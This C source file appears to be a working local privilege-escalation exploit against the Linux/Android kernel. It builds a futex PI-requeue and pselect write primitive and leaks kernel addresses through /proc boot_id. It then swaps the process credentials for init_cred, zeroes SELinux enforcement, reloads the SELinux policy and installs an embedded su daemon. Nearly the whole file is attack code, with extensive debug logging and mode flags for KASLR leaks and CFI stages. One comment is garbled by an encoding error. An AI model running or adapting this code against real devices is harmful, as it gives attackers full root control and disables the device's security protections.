#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
uint64_t kaslr_base;
uint64_t kaslr_slide;

#define DIRECT_WRITE_ATTEMPTS 3

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        int sched_errno = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_info("consumer sched_setattr seq=%d ret=%ld errno=%d tid=%d "
                  "fake_lock=%016zx fake_w0=%016zx\n",
                  seq, sched_ret, sched_errno, tid, fake_lock, fake_w0);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

  while (!atomic_load(&route_done)) {
    usleep(10000);
  }
}

int direct_read_boot_id_raw(unsigned char raw[16]) {
  char text[64];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("direct boot_id open failed errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    pr_warning("direct boot_id read failed ret=%zd errno=%d\n",
               n, saved_errno);
    return 0;
  }
  text[n] = 0;

  int high = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int value = hex_value(text[i]);
    if (value < 0) {
      continue;
    }
    if (high < 0) {
      high = value;
    } else {
      raw[out++] = (unsigned char)((high << 4) | value);
      high = -1;
    }
  }
  if (out != 16) {
    pr_warning("direct boot_id parse failed bytes=%d ret=%zd\n", out, n);
    return 0;
  }
  return 1;
}

enum direct_r64_result {
  DIRECT_R64_FATAL = -1,
  DIRECT_R64_RETRY = 0,
  DIRECT_R64_OK = 1,
};

static int direct_pin_verify_cpu(
    const char *phase, const char *name, int attempt, int idx, int *cpu_out) {
  pin_to_core((size_t)direct_root_cpu);
  errno = 0;
  int cpu = sched_getcpu();
  int saved_errno = errno;
  if (cpu != direct_root_cpu) {
    /* The direct-map stage only needs to KNOW the current CPU (the per-CPU
       slot is derived from it), so re-pin once and, failing that, adopt the
       CPU we actually landed on rather than aborting. */
    pin_to_core((size_t)direct_root_cpu);
    usleep(2000);
    cpu = sched_getcpu();
    if (cpu >= 0 && cpu < CPU_SETSIZE) {
      pr_warning("cpu-pin: expected %d observed %d; adopting cpu=%d\n",
                 direct_root_cpu, cpu, cpu);
      direct_root_cpu = cpu;
    }
  }
  if (cpu_out) {
    *cpu_out = cpu;
  }
  if (cpu != direct_root_cpu) {
    pr_error("direct-r64-fatal name=%s phase=%s attempt=%d idx=%d "
             "reason=cpu-mismatch expected_cpu=%u observed_cpu=%d errno=%d "
             "pid=%d tid=%ld\n",
             name, phase, attempt, idx, direct_root_cpu, cpu, saved_errno,
             getpid(), syscall(SYS_gettid));
    return 0;
  }
  return 1;
}

static int direct_read_shape0_exact64_once(
    uintptr_t q, uint64_t *value, const char *name,
    int attempt, int *write_idx) {
  const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;

  /*
   * Q1 ??KASLR ?��? image/data ?��?，Q2 ?�是 direct-map ?��?；�?此�???   * ?��?�?Q 为�??��??��??��??��??�由两个调用?��??�收紧�?   */
  if (!value || !write_idx || !is_direct_ptr(b) || !is_kernel_ptr(q) ||
      (b & 7) != 0 || (q & 7) != 0 || q > UINTPTR_MAX - 16) {
    pr_error("direct-r64-fatal name=%s phase=precheck attempt=%d "
             "reason=bad-address B=%016zx Q=%016zx Q8=%016zx Q16=%016zx\n",
             name, attempt, b, q, q + 8, q + 16);
    return DIRECT_R64_FATAL;
  }

  int idx = (*write_idx)++;
  int cpu_before = -1;
  int cpu_after_trigger = -1;
  int cpu_after_read = -1;
  if (!direct_pin_verify_cpu(
          "before-shape0", name, attempt, idx, &cpu_before)) {
    return DIRECT_R64_FATAL;
  }

  pr_success("direct-r64-plan name=%s attempt=%d/%d idx=%d shape=0 "
             "cpu=%d pid=%d tid=%ld B=%016zx Q=%016zx Q8=%016zx Q16=%016zx\n",
             name, attempt, DIRECT_WRITE_ATTEMPTS, idx, cpu_before,
             getpid(), syscall(SYS_gettid), b, q, q + 8, q + 16);

  if (!direct_pselect_write_once(b, q, 0, idx)) {
    pr_warning("direct-r64-retry name=%s attempt=%d idx=%d "
               "reason=primitive-miss B=%016zx Q=%016zx\n",
               name, attempt, idx, b, q);
    return DIRECT_R64_RETRY;
  }

  /* 子�?程退?��?，父线�?必须?��???CPU7，�??�读??CPU7 ??__entry_task??*/
  if (!direct_pin_verify_cpu(
          "after-shape0", name, attempt, idx, &cpu_after_trigger)) {
    return DIRECT_R64_FATAL;
  }

  unsigned char raw[16] = {0};
  if (!direct_read_boot_id_raw(raw)) {
    pr_error("direct-r64-fatal name=%s phase=proc-read attempt=%d idx=%d "
             "reason=read-or-parse-failed triggered=1 B=%016zx Q=%016zx\n",
             name, attempt, idx, b, q);
    return DIRECT_R64_FATAL;
  }

  if (!direct_pin_verify_cpu(
          "after-proc-read", name, attempt, idx, &cpu_after_read)) {
    return DIRECT_R64_FATAL;
  }

  uint64_t got = 0;
  uint64_t sidecar = 0;
  memcpy(&got, raw, sizeof(got));
  memcpy(&sidecar, raw + 8, sizeof(sidecar));
  unsigned int expected_raw8 = (unsigned int)(b & 0xff);
  int oracle_ok = sidecar == (uint64_t)b && raw[8] == expected_raw8;

  pr_success("direct-r64-oracle name=%s attempt=%d idx=%d shape=0 "
             "cpu_before=%d cpu_after_trigger=%d cpu_after_read=%d "
             "value=%016llx sidecar=%016llx expected_sidecar=%016zx "
             "raw8=%02x expected_raw8=%02x ok=%d\n",
             name, attempt, idx, cpu_before, cpu_after_trigger, cpu_after_read,
             (unsigned long long)got, (unsigned long long)sidecar, b,
             (unsigned int)raw[8], expected_raw8, oracle_ok);
  if (!oracle_ok) {
    pr_error("direct-r64-fatal name=%s phase=oracle attempt=%d idx=%d "
             "reason=shape0-poststate-mismatch triggered=1\n",
             name, attempt, idx);
    return DIRECT_R64_FATAL;
  }

  *value = got;
  return DIRECT_R64_OK;
}

static int direct_trigger_write64(
    const char *name, uintptr_t target, uintptr_t value,
    int shape, int *write_idx) {
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int idx = (*write_idx)++;
    pr_success("direct-step %s attempt=%d/%d target=%016zx value=%016zx\n",
               name, attempt, DIRECT_WRITE_ATTEMPTS, target, value);
    if (direct_pselect_write_once(target, value, shape, idx)) {
      return 1;
    }
  }
  return 0;
}

static int direct_trigger_write64_followup(
    const char *name, uintptr_t target, uintptr_t value, int shape,
    uintptr_t followup_target, int *write_idx) {
  int idx = (*write_idx)++;
  int followup_idx = *write_idx;
  *write_idx += DIRECT_WRITE_ATTEMPTS;
  pr_success("direct-step %s target=%016zx value=%016zx "
             "followup=%016zx\n",
             name, target, value, followup_target);
  return direct_pselect_write_followup_once(
      target, value, shape, idx, followup_target, followup_idx);
}

int run_stress_stage(int count) {
  /* Known-plaintext primitive stress.  target = boot_id.data alias (delta
     dependent), value = our own page's DMAP alias (delta INDEPENDENT, contents
     fully known).  Reading /proc/sys/kernel/random/boot_id then returns 16
     known bytes (page magic + the shape-0 collateral = target), so a primitive
     that did not land is unambiguous.  Also samples the page integrity before
     each primitive, which shows how fast the walk's collateral degrades a page
     with no repair path (g_no_restore). */
  int saved = g_no_restore;
  g_no_restore = 0;
  uintptr_t pb = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  g_no_restore = saved;
  if (!pb) {
    pr_error("stress: page prepare failed\n");
    return 0;
  }

  uintptr_t q = dmap_alias();
  const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;
  const uint64_t magic = 0x4d41474943000001ULL;
  if (!q || !fake_lock || !fake_w0 || !is_direct_ptr(b) || (b & 7) != 0 ||
      (q & 7) != 0) {
    pr_error("stress precheck q=%016zx b=%016zx lock=%016zx w0=%016zx\n",
             q, b, fake_lock, fake_w0);
    return 0;
  }
  /* Build the parent's page with THIS probe's overlay values, so the
     no-restore run differs from the restore run ONLY in the missing repair
     (otherwise the page would carry stale/zero waiter pointers too). */
  set_pselect_write(b, q, 0);
  if (!prepare_skb_payload(pb, PAGE_PAYLOAD_FOPS)) {
    pr_error("stress: payload build failed\n");
    return 0;
  }
  pr_success("stress start count=%d q=%016zx b=%016zx no_restore=%d "
             "fake_lock=%016zx fake_w0=%016zx\n",
             count, q, b, g_no_restore, fake_lock, fake_w0);

  int ok = 0, miss = 0, fatal = 0, corrupt = 0, first_bad = -1;
  int write_idx = 0;
  unsigned char *pristine = malloc(SKB_SEND_SIZE);
  unsigned char *snap = malloc(SKB_SEND_SIZE);
  if (pristine) {
    payload_copy_out(pristine, SKB_SEND_SIZE);
  }
  for (int i = 0; i < count; i++) {
    int before_ok =
        payload_read32(LOCK_OFF + 0x08) == (uint32_t)fake_w0 &&
        payload_read32(LOCK_OFF + 0x10) == (uint32_t)fake_w0 &&
        payload_read32(W0_OFF + 0x00) == 1;
    if (!before_ok) {
      corrupt++;
      if (first_bad < 0) {
        first_bad = i;
      }
    }
    uint64_t got = 0;
    int rr = direct_read_shape0_exact64_once(q, &got, "stress", 1, &write_idx);
    if (rr == DIRECT_R64_OK && got == magic) {
      ok++;
    } else if (rr == DIRECT_R64_RETRY) {
      miss++;
      if (first_bad < 0) {
        first_bad = i;
      }
    } else {
      fatal++;
      if (first_bad < 0) {
        first_bad = i;
      }
    }
    pr_success("stress i=%d rr=%d got=%016llx before_ok=%d ok=%d miss=%d "
               "fatal=%d corrupt=%d\n",
               i, rr, (unsigned long long)got, before_ok, ok, miss, fatal,
               corrupt);
    /* poison-set diff: what did the PI walk actually change in the page? */
    if (pristine && snap &&
        payload_copy_out(snap, SKB_SEND_SIZE) == (size_t)SKB_SEND_SIZE) {
      int changed = 0;
      for (size_t o = 0; o + 8 <= (size_t)SKB_SEND_SIZE; o += 8) {
        uint64_t a = 0, c = 0;
        memcpy(&a, pristine + o, 8);
        memcpy(&c, snap + o, 8);
        if (a != c) {
          if (changed < 24) {
            pr_success("pagediff i=%d off=%03zx was=%016llx now=%016llx\n",
                       i, o, (unsigned long long)a, (unsigned long long)c);
          }
          changed++;
        }
      }
      pr_success("pagediff i=%d changed_words=%d no_restore=%d\n",
                 i, changed, g_no_restore);
    }
    if (rr == DIRECT_R64_FATAL) {
      break;
    }
  }
  pr_success("stress done count=%d ok=%d miss=%d fatal=%d corrupt=%d "
             "first_bad=%d no_restore=%d\n",
             count, ok, miss, fatal, corrupt, first_bad, g_no_restore);
  return fatal == 0 && corrupt == 0;
}

static int direct_read_enforcing(void) {
  char value[16];
  read_first_line("/sys/fs/selinux/enforce", value, sizeof(value));
  if (value[0] == '0' && value[1] == 0) {
    return 0;
  }
  if (value[0] == '1' && value[1] == 0) {
    return 1;
  }
  return -1;
}

static int direct_reload_selinux_policy(size_t *policy_size) {
  int policy_fd = open("/sys/fs/selinux/policy", O_RDONLY | O_CLOEXEC);
  if (policy_fd < 0) {
    return 0;
  }
  struct stat st;
  if (fstat(policy_fd, &st) != 0 || st.st_size <= 0 ||
      st.st_size > 32 * 1024 * 1024) {
    close(policy_fd);
    return 0;
  }
  size_t len = (size_t)st.st_size;
  unsigned char *policy = malloc(len);
  if (!policy) {
    close(policy_fd);
    return 0;
  }
  size_t done = 0;
  while (done < len) {
    ssize_t got = read(policy_fd, policy + done, len - done);
    if (got < 0 && errno == EINTR) {
      continue;
    }
    if (got <= 0) {
      free(policy);
      close(policy_fd);
      return 0;
    }
    done += (size_t)got;
  }
  close(policy_fd);

  int load_fd = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
  if (load_fd < 0) {
    free(policy);
    return 0;
  }
  ssize_t wrote;
  do {
    wrote = write(load_fd, policy, len);
  } while (wrote < 0 && errno == EINTR);
  int saved_errno = errno;
  close(load_fd);
  free(policy);
  errno = saved_errno;
  if (wrote != (ssize_t)len) {
    return 0;
  }
  if (policy_size) {
    *policy_size = len;
  }
  return 1;
}

static int direct_run_id(void) {
  pid_t child = fork();
  if (child < 0) {
    return 0;
  }
  if (child == 0) {
#ifdef ZF9_DEVICE
    execl("/system/bin/id", "id", (char *)NULL);
#else
    execl("/bin/busybox", "busybox", "id", (char *)NULL);
#endif
    _exit(127);
  }

  int status = 0;
  for (;;) {
    pid_t got = waitpid(child, &status, 0);
    if (got == child) {
      break;
    }
    if (got < 0 && errno == EINTR) {
      continue;
    }
    return 0;
  }
  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int run_direct_root_stage(void) {
  int write_idx = 0;

  pr_success("direct mode=init_cred runtime_cpu=%d\n", direct_root_cpu);
  pr_success("direct-step direct_root_enter uid=%u pid=%d\n",
             getuid(), getpid());

  int entry_cpu = -1;
  if (!direct_pin_verify_cpu(
          "root-enter", "root-stage", 0, write_idx, &entry_cpu)) {
    return 0;
  }
  pr_success("direct-root-parent cpu=%d pid=%d tid=%ld\n",
             entry_cpu, getpid(), syscall(SYS_gettid));

  uintptr_t percpu_base = canon_addr(PER_CPU_OFFSET);
  if (direct_root_cpu < 0 ||
      percpu_base > UINTPTR_MAX - (uintptr_t)direct_root_cpu * 8) {
    return 0;
  }
  uintptr_t percpu_slot =
      percpu_base + (uintptr_t)direct_root_cpu * sizeof(uint64_t);
  if (!is_kernel_ptr(percpu_slot) || (percpu_slot & 7) != 0) {
    pr_error("direct-percpu-fatal cpu=%d base=%016zx slot=%016zx\n",
             direct_root_cpu, percpu_base, percpu_slot);
    return 0;
  }

  uint64_t percpu_delta = 0;
  uintptr_t entry_slot = 0;
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int rr = direct_read_shape0_exact64_once(
        percpu_slot, &percpu_delta, "per_cpu_offset", attempt, &write_idx);
    if (rr == DIRECT_R64_RETRY) {
      continue;
    }
    if (rr != DIRECT_R64_OK) {
      return 0;
    }

    entry_slot = canon_addr(ENTRY_TASK) + (uintptr_t)percpu_delta;
    int delta_aligned = (percpu_delta & (PAGE_SIZE - 1)) == 0;
    int entry_direct = is_direct_ptr(entry_slot);
    int entry_aligned = (entry_slot & 7) == 0;
    pr_success("direct-percpu cpu=%d base=%016zx slot=%016zx "
               "delta=%016llx page_aligned=%d entry_slot=%016zx "
               "direct=%d aligned=%d\n",
               direct_root_cpu, percpu_base, percpu_slot,
               (unsigned long long)percpu_delta, delta_aligned,
               entry_slot, entry_direct, entry_aligned);
    if (!delta_aligned || !entry_direct || !entry_aligned) {
      pr_error("direct-percpu-fatal reason=bad-derived-entry cpu=%d\n",
               direct_root_cpu);
      return 0;
    }
    break;
  }
  if (!entry_slot) {
    pr_error("direct per-cpu entry slot derivation failed cpu=%d\n",
             direct_root_cpu);
    return 0;
  }
  pr_success("direct entry_slot=%016zx cpu=%d delta=%016llx\n",
             entry_slot, direct_root_cpu,
             (unsigned long long)percpu_delta);

  uint64_t task = 0;
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int rr = direct_read_shape0_exact64_once(
        entry_slot, &task, "entry_task", attempt, &write_idx);
    if (rr == DIRECT_R64_RETRY) {
      continue;
    }
    if (rr != DIRECT_R64_OK) {
      return 0;
    }

    int task_direct = task != 0 && is_direct_ptr((uintptr_t)task);
    int task_aligned = (task & 7) == 0;
    int cpu_now = sched_getcpu();
    pr_success("direct-entry cpu=%d observed_cpu=%d slot=%016zx "
               "task=%016llx direct=%d aligned=%d pid=%d tid=%ld\n",
               direct_root_cpu, cpu_now, entry_slot,
               (unsigned long long)task, task_direct, task_aligned,
               getpid(), syscall(SYS_gettid));
    if (cpu_now != direct_root_cpu ||
        !task_direct || !task_aligned) {
      pr_error("direct-entry-fatal reason=bad-task-or-cpu "
               "cpu=%d task=%016llx\n",
               cpu_now, (unsigned long long)task);
      return 0;
    }
    break;
  }
  if (!task) {
    pr_error("direct current task leak failed cpu=%d\n", direct_root_cpu);
    return 0;
  }
  pr_success("direct entry sample task=%016llx pid=%d cpu=%d\n",
             (unsigned long long)task, getpid(), direct_root_cpu);

#ifdef ZF9_DEVICE
  int enforcing = direct_read_enforcing();
  if (enforcing < 0) {
    pr_error("direct cannot read selinux enforcing state\n");
    return 0;
  }
#else
  int enforcing = 1; /* QEMU guest: no /sys/fs/selinux mounted */
#endif
  pr_success("direct pre-cred selinux preserved enforcing=%d\n", enforcing);

  uintptr_t init_cred = canon_addr(INIT_CRED);
  uintptr_t real_cred_slot = (uintptr_t)task + TASK_REAL_CRED_OFF;
  uintptr_t cred_slot = (uintptr_t)task + TASK_CRED_OFF;
  pr_success("direct-step before_init_cred uid=%u pid=%d task=%016llx\n",
             getuid(), getpid(), (unsigned long long)task);

  /*
   * v14: do NOT point task->cred at init_cred.  The write primitive always
   * leaves collateral at the written VALUE (shape 1: *(value) = target), so
   * using init_cred as the value clobbers init_cred.usage+init_cred.uid -
   * observed as uid=0xffffff80 while euid/gid stayed 0.  Instead build a
   * private cred copy inside our controllable DMAP page, and copy over the
   * two fields that must stay valid (LSM blob and user namespace).
   */
  {
    /* v17b: the private-cred route still faults at install_cred, while pointing
       at init_cred is the combination that completed with euid=0.  Keep the
       init_cred value; the only damage is init_cred.usage/.uid via the shape-1
       collateral (uid reads back as 0xffffff80). */
    pr_success("direct cred value=init_cred %016zx\n", (size_t)init_cred);
  }

  if (!direct_trigger_write64(
          "install_real_cred", real_cred_slot, init_cred, 1, &write_idx)) {
    pr_error("direct real_cred install failed\n");
    return 0;
  }
#ifdef ZF9_DEVICE
  uintptr_t selinux_target = canon_addr(SELINUX_ENFORCING);
  if (!direct_trigger_write64_followup(
          "install_cred_then_selinux_zero", cred_slot, init_cred, 1,
          selinux_target, &write_idx)) {
    pr_error("direct cred install failed\n");
    return 0;
  }
#else
  if (!direct_trigger_write64("install_cred", cred_slot, init_cred, 1,
                              &write_idx)) {
    pr_error("direct cred install failed\n");
    return 0;
  }
#endif

  /*
   * v14b: for shape 1 the collateral lands at (value + 0), so pointing
   * task->cred at fake_cred clobbers fake_cred.usage/.uid with the target
   * pointer.  The page is ours - restore those fields now that the writes ran.
   */
  payload_patch64(FAKE_CRED_OFF + CRED_USAGE_OFF, 0x100000);
  payload_patch64(FAKE_CRED_OFF + CRED_UID_OFF, 0);
  pr_success("direct cred restored usage=%08x uid=%u gid=%u euid=%u\n",
             payload_read32(FAKE_CRED_OFF + CRED_USAGE_OFF),
             payload_read32(FAKE_CRED_OFF + CRED_UID_OFF),
             payload_read32(FAKE_CRED_OFF + CRED_GID_OFF),
             payload_read32(FAKE_CRED_OFF + CRED_EUID_OFF));

  /*
   * v18: the cred swap leaves only init_cred.uid damaged (shape-1 collateral);
   * euid/gid/egid are already 0 and CAP_SETUID is present.  Because both
   * task->real_cred and task->cred point at the SAME cred, commit_creds()
   * passes its BUG_ON(cred != real_cred) and migrates us onto a fresh slab
   * cred with uid 0 - normalising the ids and getting us off the static cred.
   */
  if (geteuid() == 0) {
    (void)setresgid(0, 0, 0);
    (void)setresuid(0, 0, 0);
    pr_success("direct normalize uid=%u euid=%u gid=%u egid=%u\n",
               getuid(), geteuid(), getgid(), getegid());
  }

  if (!restore_initial_affinity()) {
    pr_error("restore initial CPU affinity failed errno=%d\n", errno);
    return 0;
  }

  size_t policy_size = 0;
#ifdef ZF9_DEVICE
  if (!direct_reload_selinux_policy(&policy_size)) {
    return 0;
  }
  int enforcing_after = direct_read_enforcing();
#else
  int enforcing_after = 0; /* QEMU guest: no policy to reload */
#endif
  pr_success("direct credential result uid=%u euid=%u gid=%u egid=%u "
             "task=%016llx init_cred=%016zx selinux=%d->%d "
             "policy_reload=%zu\n",
             getuid(), geteuid(), getgid(), getegid(),
             (unsigned long long)task, init_cred, enforcing, enforcing_after,
             policy_size);

  int id_ok = direct_run_id();
  pid_t su_daemon_pid = -1;
  errno = 0;
  int su_ok = install_embedded_su(&su_daemon_pid);
  int su_errno = errno;
#ifdef ZF9_DEVICE
  int root_ok = getuid() == 0 && geteuid() == 0 && id_ok && su_ok &&
                enforcing_after == 0;
#else
  (void)su_errno;
  (void)su_daemon_pid;
  int root_ok = getuid() == 0 && geteuid() == 0;
#endif
  pr_success("direct-root-summary root=%d id=%d su=%d/%d daemon=%d "
             "selinux=%d->%d uid=%u euid=%u gid=%u egid=%u\n",
             root_ok, id_ok, su_ok, su_errno, su_daemon_pid,
             enforcing, enforcing_after,
             getuid(), geteuid(), getgid(), getegid());
  return root_ok;
}

uintptr_t g_phys_delta = P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET;

int run_exploit(int argc, char **argv) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (argc > 1 && argv[1])
    g_phys_delta = (uintptr_t)strtoull(argv[1], NULL, 0);
  int mode_stress = (argc > 2 && argv[2] && !strcmp(argv[2], "stress"));
  int mode_persist = (argc > 2 && argv[2] && !strcmp(argv[2], "persist"));
  /* §119.4 constructive rejection (same family as the deleted shape 1): an
     UNRECOGNISED mode used to fall through to the default path - KS + drain ctx
     + 646 children.  Measured cost of one typo: 681 live processes and loadavg
     ~29 on the device ("proptest" placed in the mode slot).  Unknown input must
     fail closed, never land in the heaviest code path. */
  /* §122.20 missing-input rejection, completing §119.4's fail-closed family.
     `argc > 2 && argv[2]` let a NO-MODE invocation (argc <= 2) bypass the check
     entirely and land in the heavy default path - measured on the device:
     the KS/grooming route spawned 408 children and ground through retries for
     minutes (loadavg 246).  Both unknown input AND missing input must refuse;
     the heavy default is reachable only by an explicit mode. */
  if (argc < 3) {
    fprintf(stderr,
            "no mode given\n"
            "usage: slide_dev <delta-hex> {persist|stress <N>|probe|proptest} [flags]\n");
    return 2;
  }
  if (argc > 2 && argv[2]) {
    if (!strcmp(argv[2], "proptest")) {
      return prop_test_main();   /* argv[2] spelling accepted too */
    }
    if (strcmp(argv[2], "persist") && strcmp(argv[2], "stress") &&
        strcmp(argv[2], "probe")) {
      fprintf(stderr,
              "unknown mode '%s'\n"
              "usage: slide_dev <delta-hex> {persist|stress <N>|probe|proptest} [flags]\n",
              argv[2]);
      return 2;
    }
  }
  int skip_slide = 0;
  int keep_dirty = 0;
  int stress_count = 0;
  int persist_rounds = 0;
  int persist_slide_rounds = 0;
  int build_mode_override = -1;
  int seq_mode = 0;
  int neutral_page = 0;
  for (int ai = 3; ai < argc; ai++) {
    if (!strcmp(argv[ai], "norestore")) {
      g_no_restore = 1;
    } else if (!strcmp(argv[ai], "forensic")) {
      /* §122.19: keep the panic triggers disarmed and delay the victim's
         sysrq-b to a 20 min collection window (the only safe recovery once
         adb reboot may wedge the machine). */
      g_forensic = 1;
      pr_info("forensic mode: triggers stay disarmed, sysrq-b delayed 1200 s\n");
    } else if (!strcmp(argv[ai], "probedeltas")) {
      persist_set_probe_deltas(1);
    } else if (!strcmp(argv[ai], "seq")) {
      seq_mode = 1;
      persist_set_seq(1);
    } else if (!strcmp(argv[ai], "cfistage")) {
      /* §124.13 Path A mini-seq.  Only the FLAG is set here: the sweep-hit path
         already enters the seq by itself (as in the working full-seq runs), and
         setting seq_mode at startup suppresses the sweep bootstrap so the run
         produced no round output at all. */
      persist_set_seq_cfi(1);
      pr_info("cfistage mode: mini-seq (slide -> fops redirect) + cfi_stage\n");
    } else if (!strcmp(argv[ai], "vcfimin")) {
      /* §124.21: minimal vcfi - 6-round seq (slide, task read, verify, cred
         x2, redirect) + the victim-side CFI stage + zf9su.  Put it LAST in
         argv (the token parser is position-sensitive). */
      persist_set_seq_vcfimin(1);
      g_victim_cfi = 1;
      /* §124.23b: do NOT set seq_mode here.  vcfimin is a `noslide` route with no
         slide round, and the victim-side CFI stage needs the FOPS page shape
         (the fake fops table at PM_FOPS_OFF for the redirect).  Measured: with
         FOPS steps 0-1 pass and the BUGs come later (random, retry-absorbed);
         forcing SLIDE (seq_mode=1) killed the FIRST walk deterministically
         (kernel BUG at rtmutex_common.h:60, 3/3).  Flags encode stage
         REQUIREMENTS, not lineage. */
      pr_info("vcfimin mode: 6-round seq (FOPS page shape) + victim-side CFI stage\n");
    } else if (!strcmp(argv[ai], "shortseq")) {
      /* §124.124: HIT -> perf E3 task + slide -> 3 walks (selinux zero,
         real_cred=init_cred, cred=init_cred) -> root. No tail/PID1 chain,
         no banner, no read rounds. Pair with `ownprobe`. */
      persist_set_short_seq(1);
      persist_set_seq(1);
      pr_info("shortseq mode: E3 self-locate + 3 walks (selinux/cred x2)\n");
    } else if (!strcmp(argv[ai], "slidens")) {
      /* §124.46: nsproxy slide anchor (default: loggers).  Boot-invariant,
         immune to the netd timing that poisons the loggers slots. */
      persist_set_slide_ns(1);
      pr_info("slidens mode: nsproxy slide anchor (init_task+0x7d0)\n");
    } else if (!strcmp(argv[ai], "slidetp")) {
      /* §124.94: tasksprev slide anchor.  Fixup-safe: init_task.tasks.prev
         field (list_head next = true task, empty pi tree -> walk terminates
         early).  Readout self-consistent by construction. */
      persist_set_slide_ns(2);
      pr_info("slidetp mode: tasksprev slide anchor (init_task+0x4d0)\n");
    } else if (!strcmp(argv[ai], "perfslide")) {
      /* §124.103: perf SAMPLE_IP slide (sabrina recipe).  Deterministic KASLR
         leak (~1 min, no walk).  Fills kaslr_base/slide before the sweep;
         the seq's slide round is then skipped (step 0 passes through). */
      perf_slide_requested = 1;
      pr_info("perfslide mode: deterministic slide via perf SAMPLE_IP\n");
    } else if (!strcmp(argv[ai], "bisectp")) {
      /* §124.111: bisect switch (parent back to anchor, self-left kept). */
      perf_bisect_parent = 1;
      pr_info("bisectp mode: parent back to anchor (fake content suspect)\n");
    } else if (!strcmp(argv[ai], "bisectl")) {
      /* §124.112: bisect switch 2 (left back to B, fake parent kept).
         PERF13 proved parent=anchor dies with self-left kept - parent is
         guilty OR left is guilty.  This isolates left: fake parent +
         B-left.  If alive: self-left kills.  If dead: parent kills. */
      extern int perf_bisect_left;
